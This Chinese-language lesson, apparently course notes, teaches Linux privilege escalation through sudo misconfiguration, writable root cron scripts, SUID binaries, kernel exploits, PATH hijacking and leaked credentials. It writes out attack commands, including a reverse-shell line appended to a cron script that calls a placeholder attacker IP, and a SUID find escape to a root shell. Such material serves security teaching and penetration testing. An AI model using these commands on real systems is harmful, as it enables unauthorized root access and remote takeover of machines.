在本节课中，我们将要学习Linux系统中的几种常见提权技术。主要内容包括滥用SUDO权限、利用定时任务、SUID特殊权限以及其他提权实例。通过学习这些方法，你将能够理解攻击者如何在获得初始立足点后，进一步提升系统权限。

## 第一部分：滥用SUDO权限提权

上一节我们介绍了课程概述，本节中我们来看看如何通过滥用配置不当的SUDO权限来实现提权。

SUDO是Linux系统的一个管理指令，它允许系统管理员授权普通用户执行部分或全部root命令。我们可以将其简单理解为一个提权工具。

![](img/7d4a46557b36fdab500fbe4282d7ea89_11.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_13.png)

SUDO命令的执行流程如下：当普通用户执行`sudo`命令时，系统会临时将用户身份切换到root，然后以root权限执行指定的命令，执行完毕后立即退回到原普通用户身份。这是一个短暂的提权过程。

![](img/7d4a46557b36fdab500fbe4282d7ea89_15.png)

需要注意，执行`sudo`时输入的密码是当前用户的密码，而非root密码。SUDO的配置文件是`/etc/sudoers`，其文件权限为0440，只有root用户和root组有权读取。普通用户无法查看或修改此文件。

我们可以使用`visudo`命令来安全地编辑此文件。在该配置文件中，定义了哪些用户或组能以何种方式执行哪些命令。配置行的基本格式如下：
```
授权用户 主机=(可切换到的用户) 是否需要密码 可执行的命令
```
例如，配置`lucy ALL=(ALL) NOPASSWD: /usr/sbin/useradd`表示用户`lucy`可以在任何主机上，无需输入密码，以任何用户身份执行`useradd`命令。

以下是两个用于检查当前用户SUDO权限的关键命令：
*   `sudo -l`：列出当前用户可以通过`sudo`执行的命令。
*   `sudo -s`：启动一个root权限的shell环境。

当我们通过`sudo -l`发现当前用户可以通过`sudo`执行某些命令时，就可以尝试利用这些命令进行提权。一个非常有用的资源是GTFOBins项目，它列出了大量Unix二进制程序在特定上下文（如SUDO、SUID）下的利用方法。

例如，如果`sudo -l`显示用户可以无密码执行`/bin/bash`，那么直接运行`sudo /bin/bash`即可获得一个root权限的shell。GTFOBins项目为许多命令（如`awk`、`find`、`curl`）提供了具体的提权利用方式。

## 第二部分：Linux定时任务提权

![](img/7d4a46557b36fdab500fbe4282d7ea89_21.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_23.png)

上一节我们探讨了SUDO权限滥用，本节中我们来看看如何利用配置不当的定时任务进行提权。

![](img/7d4a46557b36fdab500fbe4282d7ea89_25.png)

Linux系统中的定时任务（Cron Jobs）用于在预定时间自动执行脚本或命令。如果这些任务以root权限运行，并且其脚本或目录的权限配置不当，就可能被攻击者利用来提权。

![](img/7d4a46557b36fdab500fbe4282d7ea89_27.png)

提权通常涉及以下步骤：
1.  **枚举定时任务**：使用`crontab -l`查看当前用户的定时任务，或查看系统级的定时任务文件`/etc/crontab`以及`/etc/cron.d/`、`/etc/cron.hourly/`等目录。
2.  **分析任务权限**：检查发现的定时任务脚本是否具有全局写权限（例如，权限为777或所属用户可写）。使用`ls -la /path/to/cron_script`命令查看。
3.  **利用漏洞**：如果找到全局可写的脚本，并且该脚本以root权限执行，那么我们可以修改该脚本内容，插入反弹shell或添加用户等恶意命令。
    *   例如，写入一个反弹shell命令：`echo ‘bash -i >& /dev/tcp/攻击者IP/端口 0>&1’ >> /path/to/vulnerable_script.sh`
4.  **等待执行**：修改脚本后，等待定时任务下次执行，我们的恶意代码就会以root权限运行，从而获得系统最高权限。

## 第三部分：SUID特殊权限提权

上一节我们介绍了定时任务提权，本节中我们来看看利用SUID特殊权限进行提权的方法。

![](img/7d4a46557b36fdab500fbe4282d7ea89_38.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_40.png)

SUID（Set User ID）是一种特殊的文件权限。当一个具有SUID权限的可执行文件被运行时，该进程将继承文件所有者的权限，而不是执行者的权限。如果文件所有者是root，那么无论谁执行它，进程都将以root权限运行。

查找系统中具有SUID权限的文件可以使用以下命令：
```
find / -perm -u=s -type f 2>/dev/null
```
此命令会在根目录`/`下查找所有设置了SUID位的常规文件（`-type f`），并将错误信息重定向到空设备（`2>/dev/null`）以保持输出整洁。

找到SUID文件后，需要判断其是否可利用。一些常见的、已知可用来提权的SUID程序包括：
*   `nmap`（旧版本交互模式）
*   `vim`
*   `bash`（某些版本）
*   `find`
*   `more`/`less`
*   `nano`
*   `cp`

![](img/7d4a46557b36fdab500fbe4282d7ea89_42.png)

利用方法通常是通过该程序执行系统命令或启动shell。例如，利用`find`命令提权：
```
./find . -exec /bin/bash -p \;
```
此命令使用`find`的`-exec`参数执行`/bin/bash -p`（`-p`参数用于保留提升的权限），从而获得一个root shell。

![](img/7d4a46557b36fdab500fbe4282d7ea89_44.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_45.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_46.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_47.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_48.png)

**重要提示**：并非所有SUID程序都可利用。需要结合GTFOBins等项目资源，或测试程序功能来判断其是否允许执行命令或读写文件。

## 第四部分：其他提权实例

![](img/7d4a46557b36fdab500fbe4282d7ea89_50.png)

除了上述三种主要方法，Linux系统中还存在其他提权途径，本节我们将简要介绍几种。

![](img/7d4a46557b36fdab500fbe4282d7ea89_52.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_54.png)

**内核漏洞提权**：这是最直接的提权方式。通过利用操作系统内核本身的漏洞来直接获取root权限。步骤通常包括：
1.  信息收集：使用`uname -a`等命令获取系统内核版本、发行版信息。
2.  搜索漏洞：根据系统信息，在Exploit-DB等漏洞库中搜索公开的本地提权漏洞（Local Privilege Escalation， LPE）。
3.  编译与执行：将找到的漏洞利用代码（Exploit）上传到目标机器，编译并执行。成功后即可获得root权限。

![](img/7d4a46557b36fdab500fbe4282d7ea89_56.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_58.png)

**环境变量劫持提权**：如果用户能以高权限（如通过SUDO）执行某个程序，而该程序又调用了另一个未使用绝对路径的命令，就可能被劫持。攻击者可以创建一个同名的恶意程序，并修改`PATH`环境变量，使系统优先执行恶意程序，从而达到提权目的。

![](img/7d4a46557b36fdab500fbe4282d7ea89_60.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_61.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_63.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_65.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_67.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_69.png)

**敏感信息泄露**：有时，系统配置文件、日志文件或用户主目录中可能包含密码、密钥等敏感信息。通过仔细检查这些文件（如`/etc/shadow`的备份、`.bash_history`、数据库配置文件等），可能直接获取到高权限账户的凭证。

![](img/7d4a46557b36fdab500fbe4282d7ea89_71.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_73.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_75.png)

**不当权限的服务/进程**：检查以root权限运行的服务或进程，看其配置文件、数据目录是否可写。如果可以修改配置或替换关键文件，可能诱导服务以root权限执行恶意操作。

![](img/7d4a46557b36fdab500fbe4282d7ea89_77.png)

![](img/7d4a46557b36fdab500fbe4282d7ea89_79.png)
